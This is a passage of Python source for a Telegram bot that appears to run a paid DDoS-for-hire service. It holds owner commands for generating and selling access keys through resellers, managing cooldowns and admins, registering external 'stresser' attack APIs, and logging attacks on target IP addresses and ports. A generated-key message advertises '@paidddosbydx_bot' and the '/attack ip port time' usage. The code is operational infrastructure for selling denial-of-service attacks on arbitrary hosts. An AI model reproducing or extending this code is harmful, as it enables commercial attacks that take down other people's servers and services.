    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["removecooldown"])
def remove_user_cooldown(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /removecooldown <user_id>", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        
        if str(target_id) in user_fast_cooldown:
            del user_fast_cooldown[str(target_id)]
        if str(target_id) in user_main_cooldown:
            del user_main_cooldown[str(target_id)]
        
        safe_send_message(message.chat.id, f"✅ Cooldown removed for user `{target_id}`!", reply_to=message, parse_mode="Markdown")
        
        try:
            bot.send_message(target_id, "🎉 Admin has removed your cooldown! You can attack now!")
        except:
            pass
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["setfastcooldown"])
def set_user_fast_cooldown(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /setfastcooldown <user_id> <seconds>", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        seconds = int(command_parts[2])
        
        if seconds < 0:
            safe_send_message(message.chat.id, "❌ Seconds cannot be negative!", reply_to=message)
            return
        
        user_fast_cooldown[str(target_id)] = datetime.now(IST) + timedelta(seconds=seconds)
        
        safe_send_message(message.chat.id, f"✅ Fast cooldown set to {seconds}s for user `{target_id}`!", reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID or seconds!", reply_to=message)

@bot.message_handler(commands=["setmaincooldown"])
def set_user_main_cooldown(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 3:
        safe_send_message(message.chat.id, "⚠️ Usage: /setmaincooldown <user_id> <seconds>", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        seconds = int(command_parts[2])
        
        if seconds < 0:
            safe_send_message(message.chat.id, "❌ Seconds cannot be negative!", reply_to=message)
            return
        
        user_main_cooldown[str(target_id)] = datetime.now(IST) + timedelta(seconds=seconds)
        
        safe_send_message(message.chat.id, f"✅ Main cooldown set to {seconds}s for user `{target_id}`!", reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID or seconds!", reply_to=message)

@bot.message_handler(commands=["checkcooldown"])
def check_user_cooldown(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /checkcooldown <user_id>", reply_to=message)
        return
    
    try:
        target_id = int(command_parts[1])
        
        fast_cd = get_fast_cooldown_remaining(target_id)
        main_cd = get_main_cooldown_remaining(target_id)
        
        response = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        response += f"👤 **USER COOLDOWN STATUS**\n"
        response += f"🆔 ID: `{target_id}`\n"
        response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        response += f"⚡ Fast Cooldown: {fast_cd}s\n"
        response += f"🐢 Main Cooldown: {main_cd}s\n"
        
        if fast_cd == 0 and main_cd == 0:
            response += f"\n✅ User can attack now!"
        
        safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["clearallcooldown"])
def clearallcooldowns(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    user_fast_cooldown.clear()
    user_main_cooldown.clear()
    
    safe_send_message(message.chat.id, "✅ All users cooldowns cleared successfully!", reply_to=message)

@bot.message_handler(commands=["mykey"])
def my_key_command(message):
    if check_maintenance(message): return
    if check_banned(message): return
    user_id = message.from_user.id
    
    if not has_valid_key(user_id):
        safe_send_message(message.chat.id, "❌ You don't have a valid key!\n🔑 Contact owner or reseller to purchase a key", reply_to=message)
        return
    
    remaining = get_time_remaining(user_id)
    safe_send_message(message.chat.id, f"🔑 Key Details\n\n⏳ Remaining: {remaining}\n✅ Status: Active", reply_to=message)

# ============ NEW: DETAILED ACTIVE KEYS AUDIT COMMAND ============
@bot.message_handler(commands=["activekeys", "auditkeys"])
def active_keys_audit_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id) and not is_admin(user_id):
        safe_send_message(message.chat.id, "❌ Permission denied!", reply_to=message)
        return

    users = get_users()
    now_ist = datetime.now(IST)
    
    active_list = []
    
    for uid, user in users.items():
        key_expiry = user.get('key_expiry')
        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry).astimezone(IST)
                if expiry > now_ist:
                    active_list.append((uid, user, expiry))
            except:
                pass

    if not active_list:
        safe_send_message(message.chat.id, "📋 **No active key users found!**", reply_to=message, parse_mode="Markdown")
        return

    response = f"🔑 <b>ACTIVE KEYS AUDIT REPORT</b> ({len(active_list)} Users)\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

    for idx, (uid, user, expiry) in enumerate(active_list, 1):
        raw_username = str(user.get('username', 'Unknown'))
        username = raw_username.replace('_', ' ').replace('*', '').replace('`', '')
        
        details = get_user_key_details(uid)
        
        remaining = expiry - now_ist
        days = remaining.days
        hours, rem = divmod(remaining.seconds, 3600)
        mins, _ = divmod(rem, 60)
        time_left_str = f"{days}d {hours}h {mins}m left"
        
        entry = (
            f"👤 <b>#{idx} User:</b> {username} (<code>{uid}</code>)\n"
            f"🔑 <b>Key:</b> <code>{details['key']}</code>\n"
            f"🕒 <b>Redeemed:</b> <code>{details['redeemed_at']}</code>\n"
            f"👤 <b>Generated By:</b> {details['generator']}\n"
            f"⏳ <b>Expires:</b> <code>{expiry.strftime('%Y-%m-%d %H:%M')}</code> ({time_left_str})\n"
            f"──────────────────────────\n"
        )

        if len(response) + len(entry) > 3500:
            safe_send_message(message.chat.id, response, parse_mode="HTML")
            response = ""

        response += entry

    footer = f"📊 <b>Total Active Key Holders:</b> {len(active_list)}"
    response += footer
    safe_send_message(message.chat.id, response, parse_mode="HTML")

# ============ NEW: CLEAN EXPIRED USERS FROM DB ============
@bot.message_handler(commands=["cleanexpired"])
def clean_expired_users_command(message):
    if not is_owner(message.from_user.id):
        return
    
    users = get_users()
    now_ist = datetime.now(IST)
    
    cleaned_count = 0
    to_delete = []
    
    for uid, user in users.items():
        key_expiry = user.get('key_expiry')
        if key_expiry:
            try:
                expiry = datetime.fromisoformat(key_expiry).astimezone(IST)
                if now_ist >= expiry:
                    to_delete.append(uid)
            except:
                pass
        else:
            to_delete.append(uid)
    
    for uid in to_delete:
        del users[uid]
        cleaned_count += 1
        
    if cleaned_count > 0:
        save_users(users)
        
    safe_send_message(
        message.chat.id, 
        f"🧹 **DATABASE CLEANUP COMPLETE**\n\n"
        f"🗑️ Removed **{cleaned_count}** expired/invalid user records from database.\n"
        f"📊 Remaining active records: **{len(users)}**",
        reply_to=message,
        parse_mode="Markdown"
    )

# ========================================================
# --- FIX: SECURED KEY GENERATION WITH RESELLER BALANCE --
# ========================================================
@bot.message_handler(commands=["gen"])
def generate_key_command(message):
    user_id = message.from_user.id
    is_owner_flag = is_owner(user_id)
    is_reseller_flag = is_reseller(user_id)
    
    if not is_owner_flag and not is_reseller_flag:
        return

    command_parts = message.text.split()
    if len(command_parts) < 3:
        safe_send_message(message.chat.id, "⚠️ Usage: `/gen <duration> <count> [auto_delete_min]`", parse_mode="Markdown")
        return

    duration_key = command_parts[1].lower()
    try:
        count = int(command_parts[2])
        if count <= 0:
            safe_send_message(message.chat.id, "❌ Count must be at least 1.")
            return
        auto_delete_min = int(command_parts[3]) if len(command_parts) > 3 else None
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid count or delete time!")
        return

    if duration_key not in RESELLER_PRICING:
        safe_send_message(message.chat.id, "❌ Invalid duration! Check /prices")
        return

    pricing = RESELLER_PRICING[duration_key]
    total_cost = pricing['price'] * count

    resellers = get_resellers()
    
    if is_reseller_flag and not is_owner_flag:
        reseller = resellers.get(str(user_id))
        if not reseller:
            safe_send_message(message.chat.id, "❌ Reseller profile not found!")
            return

        current_balance = reseller.get('balance', 0)
        if current_balance < total_cost:
            safe_send_message(message.chat.id, 
                f"❌ **Insufficient Balance!**\n\n"
                f"🛒 **generating**: {count}x {pricing['label']}\n"
                f"💰 **Total Cost:** {total_cost} Rs\n"
                f"💵 **Your Balance:** {current_balance} Rs\n\n"
                f"Please contact the owner to top up your Saldo.", 
                parse_mode="Markdown")
            return

        reseller['balance'] -= total_cost
        save_resellers(resellers)

    keys = get_keys()
    generated_keys = []
    
    for _ in range(count):
        key = generate_key(12)
        keys[key] = {
            'key': key,
            'duration_seconds': pricing['seconds'],
            'duration_label': pricing['label'],
            'created_at': datetime.now(IST).isoformat(),
            'created_by': user_id,
            'used': False
        }
        
        if auto_delete_min:
            run_time = datetime.now(IST) + timedelta(minutes=auto_delete_min)
            scheduler.add_job(
                auto_delete_key, 
                'date', 
                run_date=run_time, 
                args=[key]
            )
        
        generated_keys.append(key)
    
    save_keys(keys)
    
    keys_text = "\n".join([f"• `<code>/redeem {k}</code>`" for k in generated_keys])
    delete_msg = f"\n\n🗑️ **Auto-Delete:** Scheduled in {auto_delete_min} minutes." if auto_delete_min else ""
    
    balance_receipt = f"\n💰 **Cost:** {total_cost} Rs\n💵 **New Balance:** {resellers.get(str(user_id), {}).get('balance', 'Unlimited')} Rs" if not is_owner_flag else "\n👑 **Owner Bypass:** Free Generation"
    
    safe_send_message(message.chat.id, 
        f"✅ {count} Key(s) Generated!\n\n🔑 Keys:\n{keys_text}\n\n🇧🇧 Usage:\n<code>/redeem KEY_HERE</code>\n@paidddosbydx_bot\n━━━━━━━━━━━━━━━━━━\n/attack ip port time\n/attack 12.345.6.78 12345 200\n   👆.           👆.             👆.    👆\n/Attack.      Ip.              Port.    Time\n⏰ Duration: {pricing['label']}{delete_msg}", 
        parse_mode="HTML")
# ========================================================
    
@bot.message_handler(commands=["blockport"])
def blockport_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /blockport <port>", reply_to=message)
        return
    
    try:
        port = int(args[1])
        if port < 1 or port > 65535:
            safe_send_message(message.chat.id, "❌ Invalid port! (1-65535)", reply_to=message)
            return
    except:
        safe_send_message(message.chat.id, "❌ Invalid port number!", reply_to=message)
        return
    
    if add_blocked_port(port):
        safe_send_message(message.chat.id, f"✅ Port {port} has been blocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"❌ Port {port} is already blocked!", reply_to=message)

@bot.message_handler(commands=["unblockport"])
def unblockport_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /unblockport <port>", reply_to=message)
        return
    
    try:
        port = int(args[1])
    except:
        safe_send_message(message.chat.id, "❌ Invalid port number!", reply_to=message)
        return
    
    if remove_blocked_port(port):
        safe_send_message(message.chat.id, f"✅ Port {port} has been unblocked!", reply_to=message)
    else:
        safe_send_message(message.chat.id, f"❌ Port {port} is not in blocked list!", reply_to=message)

@bot.message_handler(commands=["addapi"])
def addapi_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split(maxsplit=6)
    
    if len(args) < 6:
        safe_send_message(message.chat.id, 
            "⚠️ **Usage:**\n"
            "1. API with Method: `/addapi <name> <url> <key> <method> <concurrent> <max_time>`\n"
            "2. API no Method: `/addapi <name> <url> <key> None <concurrent> <max_time>`\n\n"
            "💡 *If API has no method, type 'None' in that spot.*", 
            reply_to=message)
        return
    
    try:
        name = args[1]
        url = args[2]
        key = args[3]
        method = args[4]
        concurrent = int(args[5])
        max_time = int(args[6])
        
        api_method = None if method.lower() == "none" else method
        
        new_api = {
            "name": name,
            "url": url,
            "key": key,
            "method": api_method,
            "concurrent": concurrent,
            "max_time": max_time,
            "enabled": True,
            "timeout": 30
        }
        
        API_LIST.append(new_api)
        safe_send_message(message.chat.id, 
            f"✅ **API Added Successfully!**\n\n"
            f"📡 Name: {name}\n"
            f"⚙️ Method: {api_method if api_method else 'N/A'}\n"
            f"💪 Concurrent: {concurrent}x\n"
            f"⏰ Max Time: {max_time}s", 
            reply_to=message)
            
    except ValueError:
        safe_send_message(message.chat.id, "❌ Error: Concurrent and MaxTime must be numbers.", reply_to=message)

        
@bot.message_handler(commands=["removeapi"])
def removeapi_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /removeapi <api_name>", reply_to=message)
        return
    
    api_name = args[1]
    for i, api in enumerate(API_LIST):
        if api['name'].lower() == api_name.lower():
            removed = API_LIST.pop(i)
            safe_send_message(message.chat.id, f"✅ API '{removed['name']}' removed!", reply_to=message)
            return
    
    safe_send_message(message.chat.id, f"❌ API '{api_name}' not found!", reply_to=message)
    
@bot.message_handler(commands=["list_apis"])
def list_apis_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    if not API_LIST:
        safe_send_message(message.chat.id, "📋 No APIs configured!", reply_to=message)
        return
    
    response = "📡 **API LIST**\n\n"
    for i, api in enumerate(API_LIST, 1):
        status = "🟢 ENABLED" if api['enabled'] else "🔴 DISABLED"
        method_display = api.get('method', 'N/A')
        
        response += f"{i}. **{api['name']}**\n"
        response += f"   Method: {method_display} | Concurrent: {api['concurrent']}x\n"
        response += f"   Max Time: {api['max_time']}s | Status: {status}\n"
        response += f"   URL: {api['url'][:50]}...\n\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["blocked_ports"])
def blocked_ports_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    blocked = get_blocked_ports()
    if not blocked:
        safe_send_message(message.chat.id, "📋 No ports are blocked!", reply_to=message)
        return
    
    response = "🚫 **BLOCKED PORTS**\n\n"
    response += f"Total: {len(blocked)} ports\n\n"
    
    for i in range(0, len(blocked), 10):
        response += ", ".join(map(str, blocked[i:i+10])) + "\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["apistatus"])
def apistatus_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    response = "📡 **API STATUS**\n\n"
    for api in API_LIST:
        status = "🟢 ENABLED" if api['enabled'] else "🔴 DISABLED"
        response += f"• **{api['name']}**\n"
        response += f"  Method: {api['method']} | Concurrent: {api['concurrent']}x\n"
        response += f"  Status: {status}\n\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["apion"])
def apion_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /apion <Kimstress|Goofy>", reply_to=message)
        return
    
    api_name = args[1]
    for api in API_LIST:
        if api['name'].lower() == api_name.lower():
            api['enabled'] = True
            safe_send_message(message.chat.id, f"✅ {api['name']} API enabled!", reply_to=message)
            return
    
    safe_send_message(message.chat.id, f"❌ API '{api_name}' not found!", reply_to=message)
    
@bot.message_handler(commands=["apioff"])
def apioff_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    args = message.text.split()
    if len(args) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /apioff <Kimstress|Goofy>", reply_to=message)
        return
    
    api_name = args[1]
    for api in API_LIST:
        if api['name'].lower() == api_name.lower():
            api['enabled'] = False
            safe_send_message(message.chat.id, f"❌ {api['name']} API disabled!", reply_to=message)
            return
    
    safe_send_message(message.chat.id, f"❌ API '{api_name}' not found!", reply_to=message)
    
api_usage_logs = []

def log_api_usage(api_name, user_id):
    api_usage_logs.append({
        'api': api_name,
        'user': user_id,
        'time': datetime.now(IST)
    })
    if len(api_usage_logs) > 100:
        api_usage_logs.pop(0)

@bot.message_handler(commands=["apilogs"])
def apilogs_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    if not api_usage_logs:
        safe_send_message(message.chat.id, "📋 No API usage logs yet!", reply_to=message)
        return
    
    response = "📋 **API USAGE LOGS**\n\n"
    for log in reversed(api_usage_logs[-20:]):  
        response += f"• {log['api']} - User {log['user']} - {log['time'].strftime('%H:%M:%S')}\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["rules"])
def rules_command(message):
    busy_slots, free_slots, total_slots = get_slot_status()
    
    response = "📜 **BOT RULES**\n\n"
    response += "1. No spamming attacks 🚫\n"
    response += "2. Limit kills 🐱\n"
    response += "3. Play smart 🎮\n"
    response += "4. No mods 🧹\n"
    response += "5. Be respectful 🥰\n"
    response += "6. Report issues 📋\n\n"
    response += f"✔ Slot Status: {free_slots}/{total_slots} free"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["myinfo"])
def myinfo_command(message):
    user_id = message.from_user.id
    busy_slots, free_slots, total_slots = get_slot_status()
    
    if has_valid_key(user_id):
        remaining = get_time_remaining(user_id)
        users = get_users()  
        user = users.get(str(user_id), {})
        response = f"✅ **ACCOUNT INFO**\n\n"
        response += f"🆔 ID: {user_id}\n"
        response += f"📛 Username: @{user.get('username', 'Unknown')}\n"
        response += f"⏳ Key Remaining: {remaining}\n"
        response += f"✅ Status: Active\n"
    else:
        response = f"⚠️ No account found.\nPlease contact the owner for assistance.\n\n"
    
    response += f"✔ Slot Status: {free_slots}/{total_slots} free"
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["adminstats"])
def adminstats_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    if not admin_attack_stats:
        safe_send_message(message.chat.id, "📋 No admin attacks recorded yet!", reply_to=message)
        return
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "👑 **ADMIN ATTACK STATISTICS**\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for admin_id, stats in admin_attack_stats.items():
        try:
            chat = bot.get_chat(admin_id)
            admin_name = chat.first_name or str(admin_id)
        except:
            admin_name = str(admin_id)
        
        response += f"👤 **Admin:** {admin_name}\n"
        response += f"🆔 ID: `{admin_id}`\n"
        response += f"📊 Total Attacks: **{stats['total']}**\n"
        
        if stats['last_attack']:
            time_ago = (datetime.now(IST) - stats['last_attack']).seconds
            response += f"⏱️ Last Attack: {time_ago} seconds ago\n"
        
        response += "\n───────────────────────\n\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["adminattacks"])
def adminattacks_detail_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /adminattacks <admin_id>", reply_to=message)
        return
    
    try:
        admin_id = int(command_parts[1])
    except:
        safe_send_message(message.chat.id, "❌ Invalid admin ID!", reply_to=message)
        return
    
    if admin_id not in admin_attack_stats:
        safe_send_message(message.chat.id, f"📋 No attacks found for admin {admin_id}", reply_to=message)
        return
    
    stats = admin_attack_stats[admin_id]
    
    response = f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += f"📊 **ADMIN ATTACK HISTORY**\n"
    response += f"🆔 ID: `{admin_id}`\n"
    response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    response += f"📈 Total Attacks: **{stats['total']}**\n\n"
    response += f"📜 **Recent Attacks (Last 10):**\n"
    response += "───────────────────────\n"
    
    for i, attack in enumerate(stats['attacks'][-10:], 1):
        time_str = attack['time'].strftime('%H:%M:%S')
        response += f"{i}. 🎯 {attack['target']}:{attack['port']}\n"
        response += f"   ⏱️ {attack['duration']}s | 🕐 {time_str}\n\n"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")

@bot.message_handler(commands=["activeadmins"])
def activeadmins_command(message):
    if not is_owner(message.from_user.id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    activeadmins = []
    for admin_id in ADMIN_IDS:
        if user_has_active_attack(admin_id):
            activeadmins.append(admin_id)
    
    if not activeadmins:
        safe_send_message(message.chat.id, "💤 No admins are currently attacking!", reply_to=message)
        return
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "⚔️ **ACTIVE ADMINS**\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for admin_id in activeadmins:
        for attack_id, attack in active_attacks.items():
            if attack.get('user_id') == admin_id:
                remaining = int((attack['end_time'] - datetime.now(IST)).total_seconds())
                response += f"👤 ID: `{admin_id}`\n"
                response += f"🎯 Target: {attack['target']}:{attack['port']}\n"
                response += f"⏱️ Time Left: {remaining}s\n\n"
                break
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["addadmin"])
def addadmin_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Only owner can add admins!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /addadmin <user_id>", reply_to=message)
        return
    
    try:
        new_admin_id = int(command_parts[1])
        
        if new_admin_id == BOT_OWNER:
            safe_send_message(message.chat.id, "❌ Owner is already owner!", reply_to=message)
            return
        
        if new_admin_id in ADMIN_IDS:
            safe_send_message(message.chat.id, f"❌ User {new_admin_id} is already an admin!", reply_to=message)
            return
        
        ADMIN_IDS.append(new_admin_id)
        safe_send_message(message.chat.id, f"✅ Admin {new_admin_id} added successfully!", reply_to=message)
        
        try:
            bot.send_message(new_admin_id, "🎉 You have been added as an Admin!\n\n⚠️ Note: Cooldown will apply to you (only owner has no cooldown)")
        except:
            pass
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["removeadmin"])
def removeadmin_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Only owner can remove admins!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /removeadmin <user_id>", reply_to=message)
        return
    
    try:
        admin_id = int(command_parts[1])
        
        if admin_id == BOT_OWNER:
            safe_send_message(message.chat.id, "❌ Cannot remove owner!", reply_to=message)
            return
        
        if admin_id not in ADMIN_IDS:
            safe_send_message(message.chat.id, f"❌ User {admin_id} is not an admin!", reply_to=message)
            return
        
        ADMIN_IDS.remove(admin_id)
        safe_send_message(message.chat.id, f"✅ Admin {admin_id} removed successfully!", reply_to=message)
        
        try:
            bot.send_message(admin_id, "⚠️ You have been removed as an Admin!")
        except:
            pass
    except:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)

@bot.message_handler(commands=["allowlist"])
def allow_attacklist_user(message):
    if not is_owner(message.from_user.id):
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ **Usage:** `/allowlist <user_id>`", reply_to=message, parse_mode="Markdown")
        return

    try:
        target_id = int(command_parts[1])
        whitelist = get_attacklist_whitelist()

        if target_id in whitelist:
            safe_send_message(message.chat.id, f"❌ User `{target_id}` is already allowed.", reply_to=message, parse_mode="Markdown")
            return

        whitelist.append(target_id)
        save_attacklist_whitelist(whitelist)
        safe_send_message(message.chat.id, f"✅ User `{target_id}` has been granted access to `/attacklist`!", reply_to=message, parse_mode="Markdown")
        
        try:
            bot.send_message(target_id, "🎉 **Permission Granted!** You can now use the `/attacklist` command to monitor server runs.")
        except:
            pass
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid user ID! Must be a numeric string.", reply_to=message)

@bot.message_handler(commands=["denylist"])
def deny_attacklist_user(message):
    if not is_owner(message.from_user.id):
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ **Usage:** `/denylist <user_id>`", reply_to=message, parse_mode="Markdown")
        return

    try:
        target_id = int(command_parts[1])
        whitelist = get_attacklist_whitelist()

        if target_id not in whitelist:
            safe_send_message(message.chat.id, f"❌ User `{target_id}` was not in the whitelist.", reply_to=message, parse_mode="Markdown")
            return

        whitelist.remove(target_id)
        save_attacklist_whitelist(whitelist)
        safe_send_message(message.chat.id, f"✅ Revoked `/attacklist` access for user `{target_id}`.", reply_to=message, parse_mode="Markdown")
    except ValueError:
        safe_send_message(message.chat.id, "❌ Invalid user ID!", reply_to=message)
        
@bot.message_handler(commands=["admins"])
def list_admins_command(message):
    user_id = message.from_user.id
    
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only command!", reply_to=message)
        return
    
    if not ADMIN_IDS:
        safe_send_message(message.chat.id, "📋 No admins added yet!", reply_to=message)
        return
    
    response = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    response += "👑 **ADMINS LIST**\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    for admin_id in ADMIN_IDS:
        try:
            chat = bot.get_chat(admin_id)
            username = chat.username or chat.first_name or str(admin_id)
            if chat.username:
                username = f"@{chat.username}"
            else:
                username = chat.first_name or str(admin_id)
        except:
            username = str(admin_id)
        
        stats = admin_attack_stats.get(admin_id, {'total': 0, 'last_attack': None})
        total_attacks = stats.get('total', 0)
        last_attack = stats.get('last_attack')
        
        is_attacking = user_has_active_attack(admin_id)
        status = "🔴 ATTACKING" if is_attacking else "🟢 IDLE"
        
        response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        response += f"🆔 **ID:** `{admin_id}`\n"
        response += f"📛 **Username:** {username}\n"
        response += f"💥 **Total Attacks:** {total_attacks}\n"
        response += f"📊 **Status:** {status}\n"
        
        if last_attack:
            time_ago = (datetime.now(IST) - last_attack).seconds
            minutes = time_ago // 60
            seconds = time_ago % 60
            response += f"⏱️ **Last Attack:** {minutes}m {seconds}s ago\n"
        else:
            response += f"⏱️ **Last Attack:** Never\n"
        
        response += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    response += f"\n👥 **Total Admins:** {len(ADMIN_IDS)}\n"
    response += "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    
    safe_send_message(message.chat.id, response, reply_to=message, parse_mode="Markdown")
    
@bot.message_handler(commands=["addreseller"])
def addreseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ This command can only be used by the owner!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /addreseller <id or @username>", reply_to=message)
        return
    
    reseller_id, resolved_name = resolve_user(command_parts[1])
    if not reseller_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(reseller_id) in resellers:
        safe_send_message(message.chat.id, "❌ This user is already a reseller!", reply_to=message)
        return
    
    resellers[str(reseller_id)] = {
        'user_id': reseller_id,
        'username': resolved_name,
        'balance': 0,
        'added_at': datetime.now(IST).isoformat(),
        'blocked': False
    }
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Reseller added!\n\n👤 User: {resolved_name or reseller_id}", reply_to=message)

@bot.message_handler(commands=["removereseller"])
def removereseller_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    command_parts = message.text.split()
    if len(command_parts) != 2:
        safe_send_message(message.chat.id, "⚠️ Usage: /removereseller <id or @username>", reply_to=message)
        return
    
    target_id, resolved_name = resolve_user(command_parts[1])
    if not target_id:
        safe_send_message(message.chat.id, "❌ User not found!", reply_to=message)
        return
    
    resellers = get_resellers()
    if str(target_id) not in resellers:
        safe_send_message(message.chat.id, "❌ This user is not a reseller!", reply_to=message)
        return
    
    del resellers[str(target_id)]
    save_resellers(resellers)
    
    safe_send_message(message.chat.id, f"✅ Reseller {resolved_name or target_id} removed successfully!", reply_to=message)

@bot.message_handler(commands=["all_resellers"])
def all_resellers_command(message):
    user_id = message.from_user.id
    if not is_owner(user_id):
        safe_send_message(message.chat.id, "❌ Owner only!", reply_to=message)
        return
    
    resellers = get_resellers()
    if not resellers:
